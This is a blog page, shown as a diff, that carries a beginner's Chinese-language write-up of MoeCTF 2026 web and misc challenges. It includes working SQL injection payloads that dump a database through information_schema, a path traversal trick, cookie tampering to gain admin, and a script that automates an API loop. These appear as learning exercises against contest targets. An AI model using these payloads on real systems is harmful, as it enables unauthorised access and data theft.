@@ -1,0 +1,477 @@
+<!doctype html>
+<html lang="en"><head>
+<title>Moectf-2026解题思路与感想 - Hexo</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="Moectf-2026解题思路与感想1.查分系统前端信息泄露题型查看网页源代码，再在网页中搜查moectf得到答案,moectf{y0u_c@n_reAd_th3_h+nn1} 2.Web 安全与渗透测试入门指北先将文档解压，查看网页源代码，在19行得到​moectf&#123;W3Lc0me_t0_th3_W0rLd_0f_w3BseCur1ty!!&#125;S 3.归途信息收集 + 前端基础">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Moectf-2026解题思路与感想">
+<meta property="og:url" content="https://zhi-yinfeng.github.io/2026/09/02/moectf-2026/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Moectf-2026解题思路与感想1.查分系统前端信息泄露题型查看网页源代码，再在网页中搜查moectf得到答案,moectf{y0u_c@n_reAd_th3_h+nn1} 2.Web 安全与渗透测试入门指北先将文档解压，查看网页源代码，在19行得到​moectf&#123;W3Lc0me_t0_th3_W0rLd_0f_w3BseCur1ty!!&#125;S 3.归途信息收集 + 前端基础">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/5.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/6.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/7.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/16.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/8.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/9.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/10.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/11.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/12.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/13.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/14.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/1.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/2.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/3.png">
+<meta property="og:image" content="https://zhi-yinfeng.github.io/images/15.png">
+<meta property="article:published_time" content="2026-09-01T23:23:03.000Z">
+<meta property="article:modified_time" content="2026-09-27T13:55:12.992Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhi-yinfeng.github.io/images/5.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1790517328698">
+
+<link rel="stylesheet" href="/css/style.css?v=1790517328698">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1790517328698">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1790517328698"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.0.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="John Doe"><img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="John Doe"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="John Doe">
+            <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="John Doe" alt="John Doe">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>5</div>
+        <div><span>Tags</span>0</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" target="_blank" rel="noopener" href="https://nexmoe.com/donate.html" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" target="_blank" rel="noopener" href="https://i.nexmoe.com/" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com/?_wv=1027&k=5CfKHun"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/20238211"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/nexmoe/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/atom.xml"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/">2026</a><span class="archive-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/09/23/9.21-9.27%E5%91%A8%E6%8A%A5/">SQL注入</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/18/9.14-9.20%E5%91%A8%E6%8A%A5/">9.14-9.20周报</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/09/week-report-9.7/">9.7-9.13周报</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/09/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/02/moectf-2026/">Moectf-2026解题思路与感想</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="https://nexmoe.com/" target="_blank" >
+                    <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="折影轻梦"></img>
+                    <p>折影轻梦</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2026 John Doe
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">鄂ICP备2020018486号</a>
+<br><a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">
+<img src="https://i.dawnlab.me/c0268c1e6cfd0863d6ba35be1575941a.png" width="150px"></a>
+
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png" alt="Moectf-2026解题思路与感想" loading="lazy">
+            <h1>Moectf-2026解题思路与感想</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2026年09月02日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="Moectf-2026解题思路与感想"><a href="#Moectf-2026解题思路与感想" class="headerlink" title="Moectf-2026解题思路与感想"></a>Moectf-2026解题思路与感想</h1><h2 id="1-查分系统"><a href="#1-查分系统" class="headerlink" title="1.查分系统"></a>1.<strong>查分系统</strong></h2><h5 id="前端信息泄露题型"><a href="#前端信息泄露题型" class="headerlink" title="前端信息泄露题型"></a>前端信息泄露题型</h5><p>查看网页源代码，再在网页中搜查moectf得到答案,moectf{y0u_c@n_reAd_th3_h+nn1}</p>
+<h2 id="2-Web-安全与渗透测试入门指北"><a href="#2-Web-安全与渗透测试入门指北" class="headerlink" title="2.Web 安全与渗透测试入门指北"></a>2.Web 安全与渗透测试入门指北</h2><p>先将文档解压，查看网页源代码，在19行得到​<code>moectf&#123;W3Lc0me_t0_th3_W0rLd_0f_w3BseCur1ty!!&#125;</code>S</p>
+<h2 id="3-归途"><a href="#3-归途" class="headerlink" title="3.归途"></a>3.归途</h2><h5 id="信息收集-前端基础-接口测试"><a href="#信息收集-前端基础-接口测试" class="headerlink" title="信息收集 + 前端基础 + 接口测试"></a>信息收集 + 前端基础 + 接口测试</h5><p>F12控制台得到Key1-N2ghNUkkTQ&#x3D;&#x3D;，再在网页源代码中得到Key2-QDBtNG9k，在网络中看到一直出现弹窗getKey?id&#x3D;3，得到Key3-M0szeUVuKw==<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/5.png" alt="5" data-caption="5" loading="lazy"></p>
+<p>同理，得到Key4-ZXJUaDFzbGE&#x3D;，同时由这句话​<code>Do you know HTTP headers? Check it.</code>​得到Key5-ITkzdA==<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/6.png" alt="6" data-caption="6" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/7.png" alt="7" data-caption="7" loading="lazy"></p>
+<p>将GET传参改成POST，得到Key6-ZnwxbGFA</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/16.png" alt="16" data-caption="16" loading="lazy"></p>
+<p>再在URL接login,将用户名及给的密码输入</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/8.png" alt="8" data-caption="8" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/9.png" alt="9" data-caption="9" loading="lazy"></p>
+<p>cookie中将user&#x3D;guest改为user&#x3D;admin,得到Key7-NGFAZzY5Nmc5</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/10.png" alt="10" data-caption="10" loading="lazy"></p>
+<p>将robots.txt接入URL</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/11.png" alt="11" data-caption="11" loading="lazy"></p>
+<p>得到​<code>/f13ggggg</code>将它接入URL，得到合成钥匙</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/12.png" alt="12" data-caption="12" loading="lazy"></p>
+<p>将Key1至Key7合成得到</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/13.png" alt="13" data-caption="13" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/14.png" alt="14" data-caption="14" loading="lazy"></p>
+<h2 id="4-MoeCatchTheFrogs"><a href="#4-MoeCatchTheFrogs" class="headerlink" title="4.MoeCatchTheFrogs"></a>4.MoeCatchTheFrogs</h2><p>由题可知，我们需要让AI帮忙设计一个能快速得到前8只青蛙的代码，跑的代码如下:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fullCollect</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;开始自动捕获青蛙...&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> totalDrawn = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 循环抽卡直到集齐9只</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/api/draw&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">credentials</span>: <span class="string">&quot;same-origin&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> res.<span class="title function_">json</span>();</span><br><span class="line">        totalDrawn++;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`第<span class="subst">$&#123;totalDrawn&#125;</span>次捕获，拿到稀有度<span class="subst">$&#123;data.rarity&#125;</span>的青蛙`</span>);</span><br><span class="line">        <span class="comment">// 检查是否已经集齐0-8所有稀有度</span></span><br><span class="line">        <span class="keyword">const</span> collected = <span class="keyword">new</span> <span class="title class_">Set</span>(data.<span class="property">frogs</span>);</span><br><span class="line">        <span class="keyword">if</span> ([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>].<span class="title function_">every</span>(<span class="function"><span class="params">r</span> =&gt;</span> collected.<span class="title function_">has</span>(r))) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;✅ 所有9种青蛙全部收集完成！&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 自动领取奖励</span></span><br><span class="line">    <span class="keyword">const</span> claimRes = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/api/claim&quot;</span>, &#123; <span class="attr">credentials</span>: <span class="string">&quot;same-origin&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">const</span> claimData = <span class="keyword">await</span> claimRes.<span class="title function_">json</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🎉 拿到Flag：&quot;</span>, claimData.<span class="property">flag</span>);</span><br><span class="line">    <span class="comment">// 自动触发页面渲染展示flag</span></span><br><span class="line">    <span class="title function_">claimReward</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fullCollect</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>快速得到前8只青蛙，再通过Bp</p>
+<h2 id="古籍翻阅"><a href="#古籍翻阅" class="headerlink" title="古籍翻阅"></a><strong>古籍翻阅</strong></h2><p>查看网页源代码会发现有一个藏书和其他藏书格式不一样</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/1.png" alt="1" data-caption="1" loading="lazy"></p>
+<p>访问一下会发现</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/2.png" alt="2" data-caption="2" loading="lazy"></p>
+<p>用简单绕过..&#x2F;..&#x2F;..&#x2F;..&#x2F;发现仍然不行，于是写一个“合法前缀 + 穿越”的 payload，用 shi&#x2F;（附件里真实存在的部名）当敲门砖，</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/3.png" alt="3" data-caption="3" loading="lazy"></p>
+<h2 id="河湖小盗"><a href="#河湖小盗" class="headerlink" title="河湖小盗"></a><strong>河湖小盗</strong></h2><p>是一个sql注入的题型，刚开始学习完sql注入的理论知识，感觉自己很行，刚看这道题的时候很懵圈，借助了AI知道了这种题应该怎么做，后面还会再接着做sql注入的题型</p>
+<h5 id="先判断注入类型，是数字型还是字符型"><a href="#先判断注入类型，是数字型还是字符型" class="headerlink" title="先判断注入类型，是数字型还是字符型"></a>先判断注入类型，是数字型还是字符型</h5><table>
+<thead>
+<tr>
+<th>探测 payload</th>
+<th>返回</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>正常回显 1 行</td>
+<td>正常</td>
+</tr>
+<tr>
+<td>1’</td>
+<td>无回显</td>
+<td>无报错回显，不能走报错注入</td>
+</tr>
+<tr>
+<td>1 and 1=1– -</td>
+<td>正常回显<br /></td>
+<td>– - 注释生效</td>
+</tr>
+<tr>
+<td>1 and 1=2– -</td>
+<td>无记录</td>
+<td>存在布尔条件注入，且为数字型（无需引号闭合）由第二次可知</td>
+</tr>
+<tr>
+<td>1 or 1=1– -</td>
+<td>回显 5 行</td>
+<td>注入成功，一次性拖全表</td>
+</tr>
+</tbody></table>
+<p>因为or是满足一个条件成立就行，1&#x3D;1永远都是真的，所以会返回所有的表</p>
+<h5 id="确定列数与回显位"><a href="#确定列数与回显位" class="headerlink" title="确定列数与回显位"></a>确定列数与回显位</h5><p><strong>列数：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span><span class="comment">-- -   → 正常</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">-- -   → 无记录</span></span><br></pre></td></tr></table></figure>
+
+<p>因为题中所给的列数有三行，所以我们从3依次往上递增，发现到4就不回显了，说明只有3列</p>
+<p>为什么要再判断一遍？是因为前端和后端所显示的列数不一定是相同的，有可能后端隐藏了，所以要再判断一遍</p>
+<p><strong>回显位：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">-- -          ⇒ 三个位置全部回显</span></span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/15.png" alt="15" data-caption="15" loading="lazy"></p>
+<p>因为select后面所对应的位置就是一一对应表格的位置</p>
+<p>例如：1-序号 2-登记人 3-公开科目</p>
+<h5 id="确定数据库版本"><a href="#确定数据库版本" class="headerlink" title="确定数据库版本"></a>确定数据库版本</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,version()<span class="comment">-- -        → 8.0.46      (MySQL)</span></span><br></pre></td></tr></table></figure>
+
+<p>为什么要尝试查一下数据库版本？</p>
+<p>摸清底细，确定数据库类型，可以使用独特的语法和系统表，判断权限</p>
+<h5 id="确认当前网站在用哪个数据库"><a href="#确认当前网站在用哪个数据库" class="headerlink" title="确认当前网站在用哪个数据库"></a>确认当前网站在用哪个数据库</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">-- -       → past_paper</span></span><br></pre></td></tr></table></figure>
+
+<p>等下查表名要用到这个名字</p>
+<h5 id="确定列出库内所有表"><a href="#确定列出库内所有表" class="headerlink" title="确定列出库内所有表"></a>确定列出库内所有表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name)</span><br><span class="line">   <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;past_paper&#x27;</span>)<span class="comment">-- -       → flag_table, past_paper, public_subjects</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="确认列出所有列名"><a href="#确认列出所有列名" class="headerlink" title="确认列出所有列名"></a>确认列出所有列名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name)</span><br><span class="line">   <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="comment">-- -       → flag, id, id, note, title, id, name, subject</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="提取-flag"><a href="#提取-flag" class="headerlink" title="提取 flag"></a>提取 flag</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> flag_table)<span class="comment">-- -       → moectf&#123;h3re_i5_your_7e$7_pap3r&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>遇到sql注入的题基本上都是这个流程，通过这个题对理论知识有了更深的了解，后面还会接着尝试sql注入的题型</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="1-入门"><a href="#1-入门" class="headerlink" title="1.入门"></a>1.入门</h2><p>是一道隐写类型的题型，将二进制隐写在最下方，打开记事本将这段话复制得到二进制</p>
+<p>01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001<br>01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001<br>00110101 01100011 01111101</p>
+<p>再给AI得到flag,moectf{W31c0me_7o_m15c}</p>
+<p>‍</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1790517328678"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Moectf-2026%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%84%9F%E6%83%B3"><span class="toc-number">1.</span> <span class="toc-text">Moectf-2026解题思路与感想</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9F%A5%E5%88%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.</span> <span class="toc-text">1.查分系统</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E9%A2%98%E5%9E%8B"><span class="toc-number">1.1.0.0.1.</span> <span class="toc-text">前端信息泄露题型</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Web-%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">1.2.</span> <span class="toc-text">2.Web 安全与渗透测试入门指北</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%BD%92%E9%80%94"><span class="toc-number">1.3.</span> <span class="toc-text">3.归途</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80-%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.0.0.1.</span> <span class="toc-text">信息收集 + 前端基础 + 接口测试</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-MoeCatchTheFrogs"><span class="toc-number">1.4.</span> <span class="toc-text">4.MoeCatchTheFrogs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A4%E7%B1%8D%E7%BF%BB%E9%98%85"><span class="toc-number">1.5.</span> <span class="toc-text">古籍翻阅</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%B3%E6%B9%96%E5%B0%8F%E7%9B%97"><span class="toc-number">1.6.</span> <span class="toc-text">河湖小盗</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%88%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%8C%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E8%BF%98%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.6.0.0.1.</span> <span class="toc-text">先判断注入类型，是数字型还是字符型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%88%97%E6%95%B0%E4%B8%8E%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">1.6.0.0.2.</span> <span class="toc-text">确定列数与回显位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="toc-number">1.6.0.0.3.</span> <span class="toc-text">确定数据库版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 